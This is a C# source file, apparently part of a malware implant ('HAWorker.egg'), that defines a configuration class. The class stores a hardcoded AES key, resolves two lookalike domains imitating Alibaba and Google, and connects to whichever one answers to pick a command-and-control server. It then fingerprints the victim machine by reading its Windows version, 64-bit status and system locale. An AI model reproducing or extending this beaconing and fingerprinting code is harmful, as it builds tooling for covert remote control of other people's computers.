using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace HAWorker.egg
{
    public class Constv
    {
        private static Constv _instance = new Constv();

        private bool _isInit = false;

        public string DefaultAesKey;
        public string ServerAddr;
        public ushort ProtocolVersion = 2;
        public string OS;
        public bool Amd64;
        public int Locale;
        public static Constv Instance {
            get {
                return _instance;
            }
        }

        public bool Init() {
            DefaultAesKey = "U2FsdGVkX1+4arjl";
            //serveraddr 
            string[] domains =new string[]{ "alibrowser.net","gooogledownloadfree.biz"};
            foreach (string domain in domains) {
                IPAddress[] IPs = Dns.GetHostAddresses(domain);
                bool isConnect = false;
                foreach (IPAddress ip in IPs)
                {
                    TcpSession session = new TcpSession(ip.ToString());
                    if (session.Connect()) {
                        ServerAddr = ip.ToString();
                        session.SafeClose();
                        isConnect = true;
                        break;
                    }
                }
                if (isConnect) {
                    break;
                }
            }
            // 
            if (string.IsNullOrEmpty(ServerAddr)) {
                return false;
            }
            //os
            short major, minor, optional;
            RtlGetNtVersionNumbers(out major, out minor, out optional);
            string sMajor = major.ToString();
            string sMinor = minor.ToString();
            OS = sMajor + "." + sMinor;
            //amd64
            bool amd64 = false;
            IsWow64Process(System.Diagnostics.Process.GetCurrentProcess().Handle, ref amd64);
            Amd64 = amd64;
            //locale
            Locale = GetSystemDefaultLangID();
            return true;
        }




        [DllImport("ntdll.dll")]
        private static extern void RtlGetNtVersionNumbers(out short major, out short minor, out short optional);

        /// <summary>
        /// 是否64位
        /// </summary>
        [DllImport("kernel32.dll")]
        private static extern bool IsWow64Process(IntPtr hProcess, ref bool Wow64Process);

        [DllImport("kernel32.dll")]
        private static extern UInt16 GetSystemDefaultLangID();


    }
}
